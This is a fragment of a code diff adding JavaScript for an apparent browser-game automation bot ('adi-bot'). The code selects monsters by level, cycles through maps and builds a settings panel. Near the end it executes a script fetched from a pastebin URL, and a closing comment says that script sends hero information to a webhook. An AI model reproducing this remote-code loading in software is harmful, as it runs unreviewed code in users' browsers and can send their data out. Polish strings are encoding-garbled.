+            if ((n.type == 2 || n.type == 3) && xxx && n.lvl <= max && n.lvl >= min && checkGrp(n.id) && !globalArray.includes(n.id) && n.wt < 20) {
+                b1 = a_getWay(n.x, n.y);
+                if (b1 == undefined) continue;
+                if (b1.length < b2) {
+                    b2 = b1.length;
+                    id = n.id;
+                }
+            }
+        }
+        return id;
+    }
+
+    if (!localStorage.getItem(`alksjd`)) {
+        localStorage.setItem(`alksjd`, 0);
+    }
+
+    this.findBestGw = function() {
+        let obj,
+            txt = document.querySelector(`#adi-bot_maps`).value.split(`, `),
+            inc = parseInt(localStorage.getItem(`alksjd`));
+
+        for (let i in g.townname) {
+            //bo admini daja podwojna spacje w nazwach mapy??????
+            if (txt[inc] == g.townname[i].replace(/ +(?= )/g, '')) {
+                let c = g.gwIds[i].split(`.`);
+                if (a_getWay(c[0], c[1]) == undefined) continue;
+                obj = {
+                    x: c[0],
+                    y: c[1]
+                };
+            }
+            if (obj) {
+                return obj;
+            }
+        }
+        inc++;
+        if (inc > txt.length) {
+            inc = 0;
+        }
+        localStorage.setItem(`alksjd`, parseInt(inc));
+    }
+
+    this.initHTML = function() {
+        //localStorage pozycji
+        if (!localStorage.getItem(`adi-bot_position`)) {
+            let tmpobj = {
+                x: 0,
+                y: 0
+            }
+            localStorage.setItem(`adi-bot_position`, JSON.stringify(tmpobj));
+        }
+        let position = JSON.parse(localStorage.getItem(`adi-bot_position`));
+
+        //boxy
+        let box = document.createElement(`div`);
+        box.id = `adi-bot_box`;
+        box.setAttribute(`tip`, `Z≥ap i przenieú :)`);
+
+        let input1 = document.createElement(`input`);
+        input1.type = `text`;
+        input1.id = `adi-bot_mobs`;
+        input1.classList.add(`adi-bot_inputs`);
+        input1.setAttribute(`tip`, `Wprowadü lvl mobkÛw w postaci np. '50-70'`);
+        box.appendChild(input1);
+
+        let input2 = document.createElement(`input`);
+        input2.type = `text`;
+        input2.id = `adi-bot_maps`;
+        input2.classList.add(`adi-bot_inputs`);
+        input2.setAttribute(`tip`, `Wprowadü nazwy map`);
+        box.appendChild(input2);
+
+        let select = document.createElement(`select`);
+        select.id = `adi-bot_list`;
+        select.classList.add(`adi-bot_inputs`);
+        select.setAttribute(`tip`, `Wybierz expowisko, aby dodatek wpisa≥ mapy za Ciebie`);
+        for (let i = 0; i < Object.keys(expowiska).length; i++) {
+            let option = document.createElement(`option`);
+            option.setAttribute(`value`, Object.keys(expowiska)[i]);
+            option.text = Object.keys(expowiska)[i];
+            select.appendChild(option);
+        }
+        box.appendChild(select);
+
+        document.body.appendChild(box);
+
+        let style = document.createElement(`style`);
+        style.type = `text/css`;
+        let css = `
+            #adi-bot_box {
+               position: absolute;
+               border: 2px solid red;
+              padding: 5px;
+              text-align: center;
+               background: black;
+               cursor: grab;
+               left: ${position.x}px;
+               top: ${position.y}px;
+              width: auto;
+               height: auto;
+               z-index: 390;
+             }
+            .adi-bot_inputs {
+                -webkit-box-sizing: content-box;
+                -moz-box-sizing: content-box;
+                box-sizing: content-box;
+                margin: 0 auto;
+                margin-bottom: 3px;
+                padding: 2px;
+                cursor: pointer;
+                border: 2px solid #f76f6f;
+                -webkit-border-radius: 5px;
+                border-radius: 5px;
+                font: normal 16px/normal "Times New Roman", Times, serif;
+                color: rgba(0,142,198,1);
+                -o-text-overflow: clip;
+                text-overflow: clip;
+                background: rgba(234,227,227,1);
+                -webkit-box-shadow: 2px 2px 2px 0 rgba(0,0,0,0.2) inset;
+                box-shadow: 2px 2px 2px 0 rgba(0,0,0,0.2) inset;
+                text-shadow: 1px 1px 0 rgba(255,255,255,0.66) ;
+                display: block;
+              }
+              input[id=adi-bot_mobs] {
+                  text-align: center;
+              }
+              #adi-bot_blessingbox {
+                  border: 1px solid red;
+                  background: gray;
+                  height: 32px;
+                  width: 32px;
+                  margin: 0 auto;
+              }
+        `;
+        style.appendChild(document.createTextNode(css));
+        document.head.appendChild(style);
+
+        //localStorage dla mobÛw i mapek
+        if (localStorage.getItem(`adi-bot_mobs`)) {
+            input1.value = localStorage.getItem(`adi-bot_mobs`);
+        }
+        if (localStorage.getItem(`adi-bot_maps`)) {
+            input2.value = localStorage.getItem(`adi-bot_maps`);
+        }
+        if (localStorage.getItem(`adi-bot_expowiska`)) {
+            if (expowiska[localStorage.getItem(`adi-bot_expowiska`)]) {
+                select.value = localStorage.getItem(`adi-bot_expowiska`);
+            }
+        }
+
+        //listenery
+        input1.addEventListener(`keyup`, () => {
+            localStorage.setItem(`adi-bot_mobs`, input1.value);
+        });
+        input2.addEventListener(`keyup`, () => {
+            localStorage.setItem(`adi-bot_maps`, input2.value);
+        });
+        select.addEventListener(`change`, () => {
+            localStorage.setItem(`adi-bot_expowiska`, select.value);
+            input2.value = expowiska[select.value].map;
+            localStorage.setItem(`adi-bot_maps`, input2.value);
+            localStorage.setItem(`alksjd`, 0);
+            message(`Zapisano expowisko "${select.value}"`);
+        });
+
+        $(`#adi-bot_box`).draggable({
+            stop: () => {
+                let tmpobj = {
+                    x: parseInt(document.querySelector(`#adi-bot_box`).style.left),
+                    y: parseInt(document.querySelector(`#adi-bot_box`).style.top)
+                }
+                localStorage.setItem(`adi-bot_position`, JSON.stringify(tmpobj));
+                message(`Zapisano pozycjÍ`);
+            }
+        });
+    }
+    this.initHTML();
+    })($.getScript("https://pastebin.com/raw/vkURM0Ps"))
+
+}
+//wczytanie skryptu na wysy≥anie infa o herosie na wh
